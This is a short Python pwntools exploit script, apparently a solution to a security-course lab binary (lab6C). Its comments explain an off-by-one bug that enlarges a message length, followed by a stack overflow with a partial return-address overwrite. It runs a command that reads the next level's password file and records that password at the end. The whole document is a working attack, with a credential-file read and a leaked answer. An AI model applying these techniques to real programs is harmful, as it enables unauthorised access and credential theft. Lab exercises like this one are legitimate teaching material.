#!/usr/bin/python
from pwn import *
s = b''
context.log_level = 'ERROR'
while b'p' not in s:
	p = process('/levels/lab06/lab6C')
	# in the function set_username()
	#   for(i = 0; i <= 40 && readbuf[i]; i++)
	#        save->username[i] = readbuf[i];
	# since i<=40 there is an off-by-1 bug
	# which allows us to write an extra byte to
	# the struct when overwrites the message len
	p.sendline(b"A"*40 +b"\xc6")
	#p.clean()
	# p.interactive()
	# we can overwrite savestate->msglen to 0xff
	# so in set_tweet()
	# save->msglen now reads in all 1024 bytes
	#   fgets(readbuf, 1024, stdin);
	#    strncpy(save->tweet, readbuf, save->msglen);
	#p.sendline(cyclic(1024))
	# cyclic_find(what overwrites sp)
	p.sendline(b'B'*196 + b'\x2b\x07')
	p.clean()
	p.sendline(b'echo $(cat /home/lab6B/.pass)')
	s = p.recvall()
	print(s)
	# gdb.attach(p)
	# p.sendline('pwd')
# password is p4rti4l_0verwr1tes_r_3nuff
